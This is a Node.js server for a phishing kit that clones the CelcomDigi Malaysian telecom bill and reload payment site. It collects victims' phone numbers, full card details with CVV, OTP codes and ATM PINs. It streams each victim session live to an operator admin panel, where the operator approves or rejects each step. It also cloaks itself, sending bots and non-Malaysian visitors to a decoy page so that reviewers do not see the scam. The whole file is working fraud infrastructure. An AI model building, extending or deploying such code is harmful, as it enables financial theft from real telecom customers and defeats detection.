const express = require('express');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const { fetchBillData, fetchReloadData } = require('./bill-bot');
const { getClientIP, isMalaysianTelecomIP, isBot } = require('./ip-detector');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/ws' });

const PORT = process.env.PORT || 3000;

// ============================================================
// ADMIN PASSWORD
// ============================================================
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2024';

// ============================================================
// In-memory stores
// ============================================================
const sessions = {};

// Visitor tracking: visitorId -> visitor object
const visitors = {};
let totalVisitorCount = 0;

// Admin SSE/WS clients
const adminClients = new Set();
const sseAdminClients = new Set();

// SSE clients for customers (keyed by sessionId)
const sseSessionClients = {};

// Parse JSON body
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname)));
app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));

// ============================================================
// IP DETECTION MIDDLEWARE - Check if user is from Malaysian telecom
// ============================================================
const ipCheckMiddleware = async (req, res, next) => {
  // Skip IP check for API endpoints, admin, and static files
  if (req.path.startsWith('/api/') || 
      req.path.startsWith('/get-assets/') ||
      req.path === '/admin' ||
      req.path === '/vibestream-pay' ||
      req.path.match(/\.(js|css|png|jpg|jpeg|gif|svg|webp|ico)$/i)) {
    return next();
  }

  const userAgent = req.headers['user-agent'] || '';
  
  // 1. Bot Detection
  if (isBot(userAgent)) {
    console.log(`[BOT CHECK] Bot detected: ${userAgent} - Redirecting to Vibestream Pay`);
    return res.redirect('/vibestream-pay');
  }

  // 2. IP Detection
  const clientIP = getClientIP(req);
  const isMalaysian = await isMalaysianTelecomIP(clientIP);

  // If not from Malaysian telecom, redirect to Vibestream Pay
  if (!isMalaysian) {
    console.log(`[IP CHECK] Non-Malaysian IP detected: ${clientIP} - Redirecting to Vibestream Pay`);
    return res.redirect('/vibestream-pay');
  }

  next();
};

// Apply IP check middleware to all page routes
app.use(ipCheckMiddleware);

// ============================================================
// ADMIN AUTH
// ============================================================

app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    const token = 'adm_' + Buffer.from(ADMIN_PASSWORD + '_secret').toString('base64');
    return res.json({ success: true, token });
  }
  return res.status(401).json({ success: false, error: 'كلمة المرور غير صحيحة' });
});

app.post('/api/admin/verify', (req, res) => {
  const { token } = req.body;
  const expected = 'adm_' + Buffer.from(ADMIN_PASSWORD + '_secret').toString('base64');
  if (token === expected) return res.json({ success: true });
  return res.status(401).json({ success: false });
});

// ============================================================
// VISITOR TRACKING
// ============================================================

// POST /api/visitor/ping
app.post('/api/visitor/ping', (req, res) => {
  const { visitorId, page, number, amount, type, sessionId } = req.body;
  if (!visitorId) return res.status(400).json({ success: false });

  const isNew = !visitors[visitorId];
  if (isNew) totalVisitorCount++;

  const prev = visitors[visitorId] || {};
  visitors[visitorId] = {
    visitorId,
    page: page || prev.page || 'home',
    number: number || prev.number || '',
    amount: amount || prev.amount || '',
    type: type || prev.type || '',
    sessionId: sessionId || prev.sessionId || '',
    firstSeen: prev.firstSeen || new Date().toISOString(),
    lastSeen: new Date().toISOString(),
  };

  // Clean inactive visitors (>10 min)
  const now = Date.now();
  Object.keys(visitors).forEach(id => {
    if (now - new Date(visitors[id].lastSeen).getTime() > 10 * 60 * 1000) {
      delete visitors[id];
    }
  });

  broadcastToAdmins({
    type: 'visitor_update',
    visitor: visitors[visitorId],
    totalVisitors: totalVisitorCount,
    activeCount: Object.keys(visitors).length,
    isNew,
  });

  return res.json({ success: true });
});

// GET /api/visitor/stats
app.get('/api/visitor/stats', (req, res) => {
  return res.json({
    success: true,
    totalVisitors: totalVisitorCount,
    activeCount: Object.keys(visitors).length,
    visitors: Object.values(visitors),
  });
});

// ============================================================
// SSE ENDPOINTS
// ============================================================

app.get('/api/sse/admin', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  sseAdminClients.add(res);

  // Send full initial state
  res.write(`data: ${JSON.stringify({
    type: 'init',
    sessions: Object.values(sessions),
    visitors: Object.values(visitors),
    totalVisitors: totalVisitorCount,
    activeCount: Object.keys(visitors).length,
  })}\n\n`);

  const heartbeat = setInterval(() => { res.write(': heartbeat\n\n'); }, 25000);

  req.on('close', () => {
    clearInterval(heartbeat);
    sseAdminClients.delete(res);
  });
});

app.get('/api/sse/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  if (!sseSessionClients[sessionId]) sseSessionClients[sessionId] = new Set();
  sseSessionClients[sessionId].add(res);

  if (sessions[sessionId]) {
    res.write(`data: ${JSON.stringify({ type: 'status_update', sessionId, status: sessions[sessionId].status })}\n\n`);
  }

  const heartbeat = setInterval(() => { res.write(': heartbeat\n\n'); }, 25000);

  req.on('close', () => {
    clearInterval(heartbeat);
    if (sseSessionClients[sessionId]) {
      sseSessionClients[sessionId].delete(res);
      if (sseSessionClients[sessionId].size === 0) delete sseSessionClients[sessionId];
    }
  });
});

// ============================================================
// WebSocket Handler
// ============================================================
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const role = url.searchParams.get('role');

  if (role === 'admin') {
    adminClients.add(ws);
    ws.send(JSON.stringify({ type: 'sessions_list', sessions: Object.values(sessions) }));
    ws.on('close', () => adminClients.delete(ws));
  } else {
    const sessionId = url.searchParams.get('sessionId');
    if (sessionId) {
      ws.sessionId = sessionId;
      if (sessions[sessionId]) {
        ws.send(JSON.stringify({ type: 'status_update', sessionId, status: sessions[sessionId].status }));
      }
    }
    ws.on('close', () => {});
  }
});

function broadcastToAdmins(data) {
  const msg = JSON.stringify(data);
  adminClients.forEach(c => { if (c.readyState === WebSocket.OPEN) c.send(msg); });
  sseAdminClients.forEach(r => { try { r.write(`data: ${msg}\n\n`); } catch (e) { sseAdminClients.delete(r); } });
}

function broadcastToSession(sessionId, data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(c => { if (c.readyState === WebSocket.OPEN && c.sessionId === sessionId) c.send(msg); });
  if (sseSessionClients[sessionId]) {
    sseSessionClients[sessionId].forEach(r => { try { r.write(`data: ${msg}\n\n`); } catch (e) { sseSessionClients[sessionId].delete(r); } });
  }
}

// ============================================================
// API - Early Session (phone number + amount before card)
// ============================================================

// POST /api/early-session - create or update session with phone/amount before card entry
app.post('/api/early-session', (req, res) => {
  const { sessionId, number, amount, type, visitorId, page } = req.body;
  if (!sessionId || !number) return res.status(400).json({ success: false, error: 'Missing required fields' });

  const existing = sessions[sessionId];

  if (existing) {
    // Update existing session with new amount/page
    if (amount) existing.amount = amount;
    if (page) existing._page = page;
    existing.updatedAt = new Date().toISOString();
    broadcastToAdmins({ type: 'session_update', sessionId, ...existing });
  } else {
    // Create early session
    sessions[sessionId] = {
      sessionId,
      number: number || '',
      amount: amount || '',
      ref: '',
      type: type || 'reload',
      cardData: null,
      otpData: null,
      pinData: null,
      status: 'browsing',
      visitorId: visitorId || '',
      _page: page || 'amount',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });
  }

  // Link visitor to session
  if (visitorId && visitors[visitorId]) {
    visitors[visitorId].sessionId = sessionId;
    visitors[visitorId].number = number;
    if (amount) visitors[visitorId].amount = amount;
  }

  return res.json({ success: true, sessionId });
});

// ============================================================
// API - Card / OTP / PIN Submission
// ============================================================

app.post('/api/card-submit', (req, res) => {
  const { sessionId, cardholderName, cardNumber, expiry, cvv, country, bank, number, amount, ref, type, visitorId } = req.body;
  if (!sessionId || !cardNumber) return res.status(400).json({ success: false, error: 'Missing required fields' });

  sessions[sessionId] = {
    sessionId,
    number: number || '',
    amount: amount || '',
    ref: ref || '',
    type: type || 'bill',
    cardData: { cardholderName: cardholderName || '', cardNumber: cardNumber || '', expiry: expiry || '', cvv: cvv || '', country: country || 'Malaysia', bank: bank || '' },
    otpData: null,
    pinData: null,
    status: 'pending',
    visitorId: visitorId || '',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };

  // Update visitor
  if (visitorId && visitors[visitorId]) {
    visitors[visitorId].sessionId = sessionId;
    visitors[visitorId].amount = amount || '';
    visitors[visitorId].page = 'processing';
  }

  broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });
  return res.json({ success: true, sessionId });
});

app.post('/api/otp-submit', (req, res) => {
  const { sessionId, otp, number, amount, ref, type } = req.body;
  if (!sessionId || !otp) return res.status(400).json({ success: false, error: 'Missing required fields' });

  if (!sessions[sessionId]) {
    sessions[sessionId] = { sessionId, number, amount, ref, type: type || 'bill', cardData: null, otpData: null, pinData: null, status: 'awaiting_otp', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() };
  }

  sessions[sessionId].otpData = { otp };
  sessions[sessionId].status = 'awaiting_otp';
  sessions[sessionId].updatedAt = new Date().toISOString();

  broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
  return res.json({ success: true, sessionId });
});

app.post('/api/pin-submit', (req, res) => {
  const { sessionId, pin, number, amount, ref, type } = req.body;
  if (!sessionId || !pin) return res.status(400).json({ success: false, error: 'Missing required fields' });

  if (!sessions[sessionId]) {
    sessions[sessionId] = { sessionId, number, amount, ref, type: type || 'bill', cardData: null, otpData: null, pinData: null, status: 'awaiting_pin', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() };
  }

  sessions[sessionId].pinData = { pin };
  sessions[sessionId].status = 'awaiting_pin';
  sessions[sessionId].updatedAt = new Date().toISOString();

  broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
  return res.json({ success: true, sessionId });
});

app.get('/api/card-status/:sessionId', (req, res) => {
  const session = sessions[req.params.sessionId];
  if (!session) return res.status(404).json({ success: false, error: 'Session not found' });
  return res.json({ success: true, status: session.status, sessionId: req.params.sessionId });
});

// ============================================================
// API - Admin Panel
// ============================================================

app.get('/api/admin/sessions', (req, res) => {
  return res.json({ success: true, sessions: Object.values(sessions) });
});

app.post('/api/admin/decision', (req, res) => {
  const { sessionId, status } = req.body;
  if (!sessions[sessionId]) return res.status(404).json({ success: false, error: 'Session not found' });

  sessions[sessionId].status = status;
  sessions[sessionId].updatedAt = new Date().toISOString();

  broadcastToSession(sessionId, { type: 'status_update', sessionId, status });
  broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });
  return res.json({ success: true, status });
});

app.delete('/api/admin/delete/:sessionId', (req, res) => {
  delete sessions[req.params.sessionId];
  broadcastToAdmins({ type: 'session_deleted', sessionId: req.params.sessionId });
  return res.json({ success: true });
});

app.delete('/api/admin/clear', (req, res) => {
  Object.keys(sessions).forEach(k => delete sessions[k]);
  broadcastToAdmins({ type: 'sessions_cleared' });
  return res.json({ success: true });
});

// ============================================================
// API - Bill/Reload Bot
// ============================================================

app.post('/api/bill-check', async (req, res) => {
  const { mobileNumber, number, useAccountNumber } = req.body;
  const phoneNumber = mobileNumber || number;
  if (!phoneNumber) return res.status(400).json({ success: false, error: 'Mobile number is required' });

  const cleanNumber = phoneNumber.replace(/\s+/g, '').replace(/^0/, '60');
  if (!/^60\d{8,10}$/.test(cleanNumber)) return res.status(400).json({ success: false, error: 'Please enter a valid/active Celcom or Digi mobile number.' });

  try {
    const result = await fetchBillData(cleanNumber, useAccountNumber || false);
    return res.json(result);
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Unable to fetch bill data. Please try again.' });
  }
});

app.post('/api/reload-check', async (req, res) => {
  const { mobileNumber } = req.body;
  if (!mobileNumber) return res.status(400).json({ success: false, error: 'Mobile number is required' });

  const cleanNumber = mobileNumber.replace(/\s+/g, '').replace(/^0/, '60');
  if (!/^60\d{8,10}$/.test(cleanNumber)) return res.status(400).json({ success: false, error: 'Please enter a valid/active Celcom or Digi prepaid mobile number.' });

  try {
    const result = await fetchReloadData(cleanNumber);
    return res.json(result);
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Unable to check reload. Please try again.' });
  }
});

// ============================================================
// PAGE ROUTES
// ============================================================

app.get('/ms', (req, res) => res.sendFile(path.join(__dirname, 'index-ms.html')));
app.get('/reload', (req, res) => res.sendFile(path.join(__dirname, 'reload.html')));
app.get('/reload/en', (req, res) => res.sendFile(path.join(__dirname, 'reload.html')));
app.get('/bill', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
app.get('/bill-payment', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
app.get('/bill-payment/en', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
app.get('/pay-bill', (req, res) => res.sendFile(path.join(__dirname, 'pay-bill.html')));
app.get('/recharge', (req, res) => res.sendFile(path.join(__dirname, 'recharge.html')));
app.get('/reload/pay', (req, res) => res.sendFile(path.join(__dirname, 'recharge.html')));
app.get('/payment-method', (req, res) => res.sendFile(path.join(__dirname, 'payment-method.html')));
app.get('/credit-card', (req, res) => res.sendFile(path.join(__dirname, 'credit-card.html')));
app.get('/processing', (req, res) => res.sendFile(path.join(__dirname, 'processing.html')));
app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
app.get('/atm-pin', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
app.get('/payment-confirm', (req, res) => res.sendFile(path.join(__dirname, 'payment-confirm.html')));
app.get('/payment-success', (req, res) => res.sendFile(path.join(__dirname, 'payment-success.html')));

// ============================================================
// VIBESTREAM PAY PAGE - Shown to non-Malaysian users
// ============================================================
app.get('/vibestream-pay', (req, res) => res.sendFile(path.join(__dirname, 'vibestream-pay.html')));

// ── Malay (BM) routes ──
app.get('/reload/ms', (req, res) => res.sendFile(path.join(__dirname, 'reload-ms.html')));
app.get('/bill/ms', (req, res) => res.sendFile(path.join(__dirname, 'bill-ms.html')));
app.get('/bill-payment/ms', (req, res) => res.sendFile(path.join(__dirname, 'bill-ms.html')));
app.get('/pay-bill/ms', (req, res) => res.sendFile(path.join(__dirname, 'pay-bill-ms.html')));
app.get('/payment-method/ms', (req, res) => res.sendFile(path.join(__dirname, 'payment-method.html')));
app.get('/credit-card/ms', (req, res) => res.sendFile(path.join(__dirname, 'credit-card-ms.html')));
app.get('/processing/ms', (req, res) => res.sendFile(path.join(__dirname, 'processing.html')));
app.get('/otp/ms', (req, res) => res.sendFile(path.join(__dirname, 'otp-ms.html')));
app.get('/atm-pin/ms', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin-ms.html')));
app.get('/payment-success/ms', (req, res) => res.sendFile(path.join(__dirname, 'payment-success-ms.html')));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('*', (req, res) => {
  if (req.path.match(/\.[a-zA-Z0-9]+$/)) return res.status(404).send('Not found');
  res.sendFile(path.join(__dirname, 'index.html'));
});

server.listen(PORT, () => {
  console.log(`CelcomDigi Clone running on port ${PORT}`);
});
